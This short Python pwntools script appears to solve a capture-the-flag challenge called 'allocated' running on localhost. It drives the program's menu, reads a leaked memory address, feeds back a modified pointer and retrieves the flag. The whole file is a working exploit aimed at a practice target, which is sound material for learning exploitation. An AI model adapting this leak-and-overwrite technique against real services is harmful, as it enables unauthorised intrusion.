from pwn import *

# io = process("./allocated")
io = remote("127.0.0.1", 8000)
io.sendlineafter(b'[0-4]: ', b'1')
io.sendlineafter(b'[0-4]: ', b'3')
io.recvuntil(b'? ')
leak = int(io.recvline()[:-1], 16)
info("Leaked address: %#x" % leak)
io.sendlineafter(b'[0-4]: ', b'2')
io.sendlineafter(b'is? ', str(leak + 1).encode())
io.sendlineafter(b'name? ', b"ashfaq-the-goat")
io.sendlineafter(b'[0-4]: ', b'4')
io.recvuntil(b'you:\n')
flag = io.recvline().decode()
info(f"FLAG: {flag}")
